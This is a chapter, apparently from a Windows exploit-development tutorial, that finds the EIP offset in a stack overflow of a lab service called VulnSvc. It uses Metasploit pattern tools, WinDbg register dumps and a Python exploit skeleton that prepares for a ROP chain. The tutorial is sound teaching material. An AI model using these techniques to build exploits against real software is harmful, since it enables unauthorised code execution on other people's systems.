## 5. Controlling EIP: offset and register survey

Replace the `A`s with a cyclic pattern to find the exact distance to EIP.

```
msf-pattern_create -l 2000
```

Send it as the third token. On the crash:

```
eip=6a413969 esp=0133e320 ...
```

```
msf-pattern_offset -q 6a413969
[*] Exact match at offset 272
```

So **272 bytes** of the third token precede the 4 bytes that land in EIP. (Your
number depends on frame layout — the compiler decides where `value`, `name`,
`command`, and the saved return address sit. Recover it, do not assume it.)

Now survey every register and the stack at the moment of the fault — this
dictates your whole strategy:

```
0:000> r
eax=00000000 ebx=... ecx=... edx=...
esi=... edi=... eip=42424242 esp=0133e320 ebp=41414141
0:000> dds esp L8
0133e320  43434343
0133e324  43434343
...
```

Questions to answer and write down:

- **Where does ESP point relative to your buffer?** Send `offset*A + BBBB +
  CCCC...` and check whether ESP points at your `C`s. In VulnSvc, ESP lands just
  past the saved EIP, so your ROP chain can begin immediately after the 4 EIP
  bytes — no extra padding. (Confirm on your build.)
- **Do any registers already point into your buffer?** Sometimes ESI/EAX hold a
  pointer you can reuse. Note it; it can save gadgets later.

> **Verify in WinDbg.** With `offset = "A"*272`, `eip = "BBBB"`, `rop = "C"*400`:
> confirm `eip=42424242` and `dds esp` shows `43434343`. That proves ESP is
> chained to controllable data — the precondition for ROP.

Lay the skeleton into the exploit:

```python
offset = b"A" * 272
eip    = b"BBBB"          # to be replaced by the first ROP gadget
rop    = b"C" * (0x400 - 272 - 4)
```

---

---

[← Previous](04-triggering-the-crash.md) · [Index](00-index.md) · [Next →](06-bad-characters.md)
